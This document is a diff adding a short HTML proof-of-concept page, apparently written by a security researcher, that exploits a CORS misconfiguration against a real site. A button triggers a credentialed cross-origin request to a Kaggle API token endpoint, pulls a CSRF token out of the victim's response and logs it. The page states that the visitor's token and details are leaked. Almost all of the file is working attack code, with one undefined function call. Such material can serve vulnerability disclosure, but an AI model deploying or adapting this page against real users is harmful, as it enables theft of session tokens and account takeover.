@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+         function cors() {
+		    var data;
+			var scripts;
+			var csrf;
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (1) {
+					data = xhttp.response;
+					scripts=data.getElementsByTagName("script");
+					csrf=scripts[4].innerHTML.split("\n");
+					console.log(csrf[4]);
+					document.write(decodeUserDisplayName());
+                    
+            }
+         };
+         xhttp.open("GET", "https://www.kaggle.com/api/token", true);
+		 xhttp.responseType = "document";
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+   <p id="pid">
+   POC by Jayateertha ,Click in Exploit,Your csrf token and other details are leaked!!!
+   </p>
+      <script>
+      document.getElementById("pid").innerText=parent.document.domain;
+      alert(document.domain);
+      </script>
+      <center>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
+
